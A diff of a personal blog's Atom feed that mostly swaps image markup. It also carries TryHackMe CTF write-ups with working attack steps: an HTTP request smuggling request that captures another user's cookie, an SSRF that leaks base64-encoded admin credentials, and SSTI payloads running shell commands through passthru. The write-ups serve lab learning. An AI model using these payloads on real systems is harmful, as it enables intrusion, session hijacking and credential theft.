+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Found issue: CL.0 desync: h2CL|TRACE /
+</span></span><span style="display:flex;"><span>Target: https://10.10.192.13
+</span></span><span style="display:flex;"><span>HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
+</span></span><span style="display:flex;"><span>Evidence: 
+</span></span><span style="display:flex;"><span>...SNIP...
+</span></span></code></pre></div><p>The extension found vulnerability using <code>Content-Length: 0</code> header (CL.0). I crafted a request to save next user request as a chat message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">POST</span> <span style="color:#fab387">/send_message</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Origin<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=0
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POST /send_message HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Content-Length: 700
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data=
+</span></span></code></pre></div><p>After playing a bit with smuggled request&rsquo;s <code>Content-Size</code> I got a user request containing the second flag as a cookie value:</p>
+<div class="tabs">
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-0" checked="checked" />
+<label for="tabs-4-0">Request</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#89b4fa">GET</span> <span style="color:#fab387">/getMessages</span> <span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#89dceb;font-weight:bold">:</span> MACHINE_IP:80
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#89dceb;font-weight:bold">:</span> session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z8tq_Q.gQXcvleCNmEbgOtBufFKNugsIP4
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#89dceb;font-weight:bold">:</span> Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+</span></span><span style="display:flex;"><span>Accept<span style="color:#89dceb;font-weight:bold">:</span> */*
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#89dceb;font-weight:bold">:</span> en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#89dceb;font-weight:bold">:</span> gzip, deflate, br
+</span></span><span style="display:flex;"><span>Referer<span style="color:#89dceb;font-weight:bold">:</span> https://MACHINE_IP:80/messages
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#89dceb;font-weight:bold">:</span> empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#89dceb;font-weight:bold">:</span> cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#89dceb;font-weight:bold">:</span> same-origin
+</span></span><span style="display:flex;"><span>Priority<span style="color:#89dceb;font-weight:bold">:</span> u=4
+</span></span><span style="display:flex;"><span>Te<span style="color:#89dceb;font-weight:bold">:</span> trailers
+</span></span></code></pre></div></div>
+<input type="radio" class="toggle" name="tabs-4" id="tabs-4-1"  />
+<label for="tabs-4-1">Response</label>
+<div class="tabs-content"><div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#cba6f7">HTTP</span><span style="color:#89dceb;font-weight:bold">/</span><span style="color:#fab387">2</span> <span style="color:#fab387">200</span> <span style="color:#fab387">OK</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#89dceb;font-weight:bold">:</span> Fri, 07 Mar 2025 22:01:08 GMT
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#89dceb;font-weight:bold">:</span> application/json
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#89dceb;font-weight:bold">:</span> 2883
+</span></span><span style="display:flex;"><span>Content-Security-Policy<span style="color:#89dceb;font-weight:bold">:</span> default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;;
+</span></span><span style="display:flex;"><span>X-Content-Type-Options<span style="color:#89dceb;font-weight:bold">:</span> nosniff
+</span></span><span style="display:flex;"><span>X-Frame-Options<span style="color:#89dceb;font-weight:bold">:</span> SAMEORIGIN
+</span></span><span style="display:flex;"><span>X-Xss-Protection<span style="color:#89dceb;font-weight:bold">:</span> 1; mode=block
+</span></span><span style="display:flex;"><span>Feature-Policy<span style="color:#89dceb;font-weight:bold">:</span> microphone &#39;none&#39;; geolocation &#39;none&#39;;
+</span></span><span style="display:flex;"><span>Age<span style="color:#89dceb;font-weight:bold">:</span> 0
+</span></span><span style="display:flex;"><span>Server<span style="color:#89dceb;font-weight:bold">:</span> El Bandito Server
+</span></span><span style="display:flex;"><span>Accept-Ranges<span style="color:#89dceb;font-weight:bold">:</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#cba6f7">&#34;JACK&#34;</span>:[<span style="color:#a6e3a1">&#34;The Galactic Enforcement&#39;s quantum sniffers are onto us, tracing our blockchain exploits.&#34;</span>,<span style="color:#a6e3a1">&#34;They&#39;re using predictive analytics, thinking they&#39;re ahead in a 4D chess game across the blockchain.&#34;</span>,<span style="color:#a6e3a1">&#34;You need to jump now! Awaiting your signal to close the portal.&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#fab387">null</span>,<span style="color:#a6e3a1">&#34;njk&#34;</span>,<span style="color:#fab387">null</span>,<span style="color:#f38ba8">...SNIP...</span><span style="color:#a6e3a1">&#34;GET /access HTTP/1.1\r\nhost: bandito.public.thm:80\r\nscheme: https\r\nsec-ch-ua: \&#34;Chromium\&#34;;v=\&#34;122\&#34;, \&#34;Not(A:Brand\&#34;;v=\&#34;24\&#34;, \&#34;HeadlessChrome\&#34;;v=\&#34;122\&#34;\r\nsec-ch-ua-mobile: ?0\r\nsec-ch-ua-platform: \&#34;Linux\&#34;\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.128 Safari/537.36\r\naccept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nsec-fetch-site: none\r\nsec-fetch-mode: navigate\r\nsec-fetch-user: ?1\r\nsec-fetch-dest: document\r\naccept-encoding: gzip, deflate, br\r\ncookie: flag=THM{\u00a1!\u00a1REDACTED!\u00a1!}\r\nX-Forwa&#34;</span>,<span style="color:#fab387">null</span>],<span style="color:#cba6f7">&#34;OLIVER&#34;</span>:[]}
+</span></span></code></pre></div></div>
+</div>
+<div class="callout note">
+    <p>You might need to try several times. HTTP smuggling isn&rsquo;t precise and can cause service disruption: I had to reboot the machine because the server kept dying.</p>
+</div>
+]]></content>
+  </entry>
   <entry>
     <title>Writeup: TryHackMe Include</title>
     <link rel="alternate" href="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/" hreflang="en"/>
@@ -72,53 +434,17 @@
 </span></span><span style="display:flex;"><span>Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></div><p>There are lots of open ports: SSH, two web apps, and a mail server.</p>
 <p>The first web app running on port 5000 is a SysMon portal. We need to find a way into it to get the first flag.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home_hu_7ecbce0bb8a16746.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_home.png" alt="Screenshot of SysMon app" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_sysmon_home.png" alt="Screenshot of SysMon app"></p>
 <p>The second web app is running on port 4000.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login_hu_e42cf2110645c7b5.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_social_login.png" alt="Screenshot of review web app login page" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_social_login.png" alt="Screenshot of review web app login page"></p>
 <p>Here, I almost missed the big &ldquo;Sign In using guest/guest&rdquo; phrase.</p>
 <h2 id="privilege-escalation-via-mass-assignment-vulnerability" >
   <a href="#privilege-escalation-via-mass-assignment-vulnerability">Privilege escalation via mass assignment vulnerability</a>
 </h2>
 <p>Logging in with guest credentials displays several profiles. Current user profile exposes a lot of properties which can be considered <a href="https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/" class="external-link">an excessive data exposure part of BOPLA</a> vulnerability. And there is a form which allows adding new properties.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_hu_4e915b21c3af1aa6.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile.png" alt="Screenshot of user profile" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_profile.png" alt="Screenshot of user profile"></p>
 <p>The form is vulnerable to the BOPLA&rsquo;s mass assignment attack, so I used it to escalate current user privileges to the administrator by changing value of <code>isAdmin</code> property.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form_hu_6b6aeed1be95a8f8.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_form.png" alt="Screenshot of the form set to isAdmin and true values" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_admin_form.png" alt="Screenshot of the form set to isAdmin and true values"></p>
 <div class="callout note">
     <p>Some writeups call this prototype pollution vulnerability, which is incorrect: we don&rsquo;t modify object prototype here.</p>
 </div>
@@ -126,16 +452,7 @@
   <a href="#getting-admin-credentials-via-ssrf">Getting admin credentials via SSRF</a>
 </h2>
 <p>After successful privilege escalation, the page has two new links: &ldquo;API&rdquo; and &ldquo;Settings&rdquo;.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin_hu_d11050bef3205cc.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_profile_admin.png" alt="Screenshot of the page with new links" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_profile_admin.png" alt="Screenshot of the page with new links"></p>
 <p>On &ldquo;API&rdquo; page there is information about how to access internal APIs; one endpoint allows getting administrator credentials.</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>API Dashboard
 </span></span><span style="display:flex;"><span>
@@ -165,38 +482,11 @@
 </span></span><span style="display:flex;"><span>    &#34;SysMonAppPassword&#34;: &#34;xxxxxxxxx&#34;,
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>&ldquo;Settings&rdquo; page allows changing banner image by providing URL.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings_hu_6407b337f74ec0d7.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_admin_settings.png" alt="Screeenshot of Admin Settings page" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_admin_settings.png" alt="Screeenshot of Admin Settings page"></p>
 <p>This page is vulnerable to SSRF attack. Instead of image URL I provided credentials endpoint:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf_hu_f934859fcb0b1717.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_banner_ssrf.png" alt="Screenshot of form set to credentials API url" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_banner_ssrf.png" alt="Screenshot of form set to credentials API url"></p>
 <p>The page includes the response in base64 encoded format:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response_hu_532fb32eb84fa139.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_ssrf_response.png" alt="Screenshot of the page displaying result of SSRF" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_ssrf_response.png" alt="Screenshot of the page displaying result of SSRF"></p>
 <p>I used CyberChef to decode it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0= 
 </span></span><span style="display:flex;"><span>
@@ -207,16 +497,7 @@
   <a href="#first-flag">First flag</a>
 </h2>
 <p>With these credentials I logged into SysMon app and got the first flag.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard_hu_b25f2afaaf89a65c.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/03/05/writeup-tryhackme-include/ctf_include_sysmon_dashboard.png" alt="Screenshot of the dashboard with displayed flag" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="ctf_include_sysmon_dashboard.png" alt="Screenshot of the dashboard with displayed flag"></p>
 <h2 id="lfi2rce-via-log-poisoning" >
   <a href="#lfi2rce-via-log-poisoning">LFI2RCE via log poisoning</a>
 </h2>
@@ -632,16 +913,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;ls flags&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
 </span></span></code></pre></div><p>And finally, to get the flag:</p>
 <div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{{[&#39;cat flags/REDACTED.txt&#39;,&#34;&#34;]|sort(&#39;passthru&#39;)|join}}
-</span></span></code></pre></div><p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard_hu_80df94a38b0d34a6.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2025/02/13/writeup-tryhackme-injectics/dashboard.png" alt="Screenshot of the dashboard with displayed flags" defer>
-	</picture>
-	
-</figure></p>
+</span></span></code></pre></div><p><img src="dashboard.png" alt="Screenshot of the dashboard with displayed flags"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1318,16 +1590,7 @@ Four shylyans were killed then:</p>
   <a href="#how-it-looks-in-the-docs">How it looks in the docs</a>
 </h2>
 <p>Now, when we render a reference documentation, we can see all values with simple markdown formatting.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2021/08/16/using-openapi-cli-custom-preprocessing/x_enum_render_hu_78bb03db39baa63b.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2021/08/16/using-openapi-cli-custom-preprocessing/x_enum_render.png" alt="Redoc with modified descriptions for extensible enumerations" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="x_enum_render.png" alt="Redoc with modified descriptions for extensible enumerations"></p>
 <div class="callout cta"><p>By the way, can you spot operations where we could have left normal <code>enum</code> and why?</p></div>
 <h2 id="why-use-a-preprocessor-here" >
   <a href="#why-use-a-preprocessor-here">Why use a preprocessor here?</a>
@@ -1456,16 +1719,7 @@ To preview a specific definition, you need to pass a definition label from confi
   <a href="#repository-structure">Repository structure</a>
 </h2>
 <p>We&rsquo;re gonna use <a href="https://github.com/Redocly/create-openapi-repo" class="external-link"><code>create-openapi-repo</code></a> to generate the initial structure and then tweak it a bit. Run <code>npx create-openapi-repo</code> inside a directory where you want to generate API structure. One caveat to keep in mind: this tool will attempt to initialize a git repository and make a commit. <a href="https://github.com/aviskase/openapi-cli-examples/tree/e5b40a5d3474eec48e236d170c15ee6faf37f631" class="external-link">Commit e5b40a5</a>.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2021/01/31/using-openapi-cli-during-api-design-part-one/initRepo_hu_7e93f6a1a355bc56.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2021/01/31/using-openapi-cli-during-api-design-part-one/initRepo.png" alt="Output of create-openapi-repo tool" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="initRepo.png" alt="Output of create-openapi-repo tool"></p>
 <p>Let&rsquo;s explore the generated files:</p>
 <ul>
 <li><code>docs</code> directory contains HTML template for reference doc. I&rsquo;m deleting it, because I don&rsquo;t need any custom template at the moment.</li>
@@ -1486,16 +1740,7 @@ To preview a specific definition, you need to pass a definition label from confi
 <p>This starts a server with the generated Redoc reference documentation (<a href="https://redoc.ly/docs/cli/commands/#preview-docs" class="external-link">docs</a>). It watches changes from the disk; usually I keep it running while writing definitions and use it like a UI of <a href="https://stoplight.io/studio/" class="external-link">Stoplight Studio</a> or <a href="https://insomnia.rest/products/designer/" class="external-link">Insomnia Designer</a>.</p>
 <p>As you may (or may not) know, you can customize how Redoc looks like. This is done with<code>referenceDocs</code> section in <code>.redocly.yaml</code> (<a href="https://redoc.ly/docs/cli/configuration/reference-docs/" class="external-link">docs</a>). Beware, some options are available only for premium edition.</p>
 <p>Options can be divided into two categories: those that affect a theme (colors, fonts) and those for disabling or enabling certain features. For example, <code>requiredPropsFirst: true</code> will display required properties before others:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2021/01/31/using-openapi-cli-during-api-design-part-one/requiredProps_hu_6b261e2f49bb40f9.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2021/01/31/using-openapi-cli-during-api-design-part-one/requiredProps.png" alt="Comparison of property display with requiredPropsFirst equal to false or true" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="requiredProps.png" alt="Comparison of property display with requiredPropsFirst equal to false or true"></p>
 <p>See <a href="https://github.com/aviskase/openapi-cli-examples/tree/c873f1593825256a58991e71cc9ec968d892c3b5" class="external-link">at commit c873f15</a>.</p>
 <h2 id="linting" >
   <a href="#linting">Linting</a>
@@ -1753,16 +1998,7 @@ To preview a specific definition, you need to pass a definition label from confi
   <a href="#advent-of-code">Advent of code</a>
 </h2>
 <p>This was the first time I did <a href="https://adventofcode.com/" class="external-link">Advent of code</a> with the devs from work: nice to compare with normal people and not <em>reddit stars</em>. Cannot express how happy I&rsquo;m to be <a href="https://github.com/aviskase/advent-of-code/tree/master/2020" class="external-link">back to Python</a>, it&rsquo;s so readable and clear after JS/TS madness.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/12/30/hmms-2020/aoc_hu_85d3b8f2d942191e.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/12/30/hmms-2020/aoc.png" alt="Advent of Code easter egg: using itertools" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="aoc.png" alt="Advent of Code easter egg: using itertools"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1946,9 +2182,7 @@ To preview a specific definition, you need to pass a definition label from confi
     <p>[&hellip;] design pressure from the bottom up.</p>
 </blockquote>
 <p>And, I don&rsquo;t want to spoil it, but the juiciest part comes later with one of the best case studies for business owners: how to ignore the lucrative niche created for you by your players/users and lose the opportunity to grab the market. By lucrative I mean&hellip; even those who don&rsquo;t play games know the biggest game in that genre ;)</p>
-<p>
-<img class="" src="/articles/2020/11/30/hmms-november/floss.gif" alt="Floss dance" >
-</p>
+<p><img src="floss.gif" alt="Floss dance"></p>
 <h2 id="blog-progress" >
   <a href="#blog-progress">Blog progress</a>
 </h2>
@@ -2503,16 +2737,7 @@ To preview a specific definition, you need to pass a definition label from confi
 </h2>
 <p>Since <a href="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/" class="internal-link">migrating to Obsidian</a> for knowledge management, I&rsquo;ve lost a track of interesting resources I read, because they are represented as atomic cross-referencing notes.</p>
 <p>Perhaps I should try to be more consistent and always write <a href="https://www.lesswrong.com/posts/T382CLwAjsy3fmecf/how-to-take-smart-notes-ahrens-2017" class="external-link">literature notes</a>. Alas, my current graph looks like that (obviously, I didn&rsquo;t have time to transfer older notes from other systems):</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/08/04/hmms-july/obsidian_july_2020_hu_9bc3d4b0c561fa28.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/08/04/hmms-july/obsidian_july_2020.png" alt="Obsidian graph view as of July 2020" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="obsidian_july_2020.png" alt="Obsidian graph view as of July 2020"></p>
 <p>In general, my topics of interests for this month were:</p>
 <ul>
 <li>jobs to be done framework</li>
@@ -2552,39 +2777,12 @@ To preview a specific definition, you need to pass a definition label from confi
 </h2>
 <p>I was more into handwriting during school and university, and there are still tons of notebooks back in Kazakhstan with course notes. I followed the same process and structure for extra studies like Coursera, and the most important thing I learned was that these notes were never ever opened and referenced later. Useless waste of stationery.</p>
 <p>One of the last examples from English&amp;French practice:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_oldnotes_hu_474efbcfcfd35482.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_oldnotes.jpg" alt="Old handwritten notebook" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_oldnotes.jpg" alt="Old handwritten notebook"></p>
 <p>Don&rsquo;t get me wrong, I love stationery. There was a time when we visited the biggest stationery store almost every day after the classes to gawk on new cute notebooks and pens. If my handwriting wasn&rsquo;t that atrocious, perhaps I&rsquo;d be more into bullet journals and scrapbooks, but alas, it still doesn&rsquo;t make them useful for anything else besides creativity outbursts.</p>
 <p>Now I use paper only for transient scribbles consumed right away or during the day, like this problem solving for <a href="https://adventofcode.com/" class="external-link">advent of code</a>.</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_notes_hu_74ced862f51e9a06.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_notes.jpg" alt="Untranslatable scribbles" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_notes.jpg" alt="Untranslatable scribbles"></p>
 <p>Though, I prefer <a href="https://getrocketbook.com/" class="external-link">Rocketbook</a>, because it&rsquo;s like a mini-whiteboard and I get to enjoy all fancy colors. Here is a note from API design brainstorming:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_rocketbook_hu_2ad1c8b2937b2623.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_rocketbook.jpg" alt="Brainstorming in Rocketbook" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_rocketbook.jpg" alt="Brainstorming in Rocketbook"></p>
 <h2 id="digital" >
   <a href="#digital">Digital</a>
 </h2>
@@ -2593,32 +2791,14 @@ To preview a specific definition, you need to pass a definition label from confi
   <a href="#non-structured">Non-structured</a>
 </h3>
 <p>The first iterations were a transposition of handwritten notes into digital via <em>Google Docs.</em></p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_gdocs_hu_11e8d1e5b8ee4a3e.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_gdocs.png" alt="Notes in the Google Docs" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_gdocs.png" alt="Notes in the Google Docs"></p>
 <p>They are as ineffective as the real notebooks. Type once and forget.</p>
 <p>The direct opposite are <em>plain text notes</em> in <a href="https://www.sublimetext.com/" class="external-link">Sublime</a> with <a href="https://github.com/aziz/PlainNotes" class="external-link">PlainNotes</a> plugin. I use them almost every day for:</p>
 <ul>
 <li>transient notes like &ldquo;did this during the smoke test&rdquo;</li>
 <li>common copy pastes</li>
 </ul>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_sublime_hu_decce16aefa8e880.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_sublime.png" alt="Sublime with PlainNotes" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_sublime.png" alt="Sublime with PlainNotes"></p>
 <h3 id="mind-maps" >
   <a href="#mind-maps">Mind maps</a>
 </h3>
@@ -2629,16 +2809,7 @@ To preview a specific definition, you need to pass a definition label from confi
 <li><a href="https://www.mindomo.com/" class="external-link">Mindomo</a>: my latest selection, not free, yet has feature no one else has (more on that later).</li>
 </ul>
 <p>As of now I have an assortment of mind maps in various formats, like <a href="https://www.aviskase.com/articles/2018/03/19/mega-mind-map-version-2/" class="internal-link">Freeplane</a> or XMind:</p>
-<p>
-<figure>
-  <picture>
-    
-    
-    <source srcset="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_xmind_hu_7ecaaaffcc714c83.webp" type="image/webp">
-    <img class="" src="https://www.aviskase.com/articles/2020/07/03/knowledge-management-tools/km_xmind.png" alt="XMind mind map overview" defer>
-	</picture>
-	
-</figure></p>
+<p><img src="km_xmind.png" alt="XMind mind map overview"></p>
 <p>I liked mind map for capturing phase, but for some inexplicable reason, I found them uncomfortable for referencing. They have the same fate as old course notes.</p>
 <h3 id="outliners" >
   <a href="#outliners">Outliners</a>
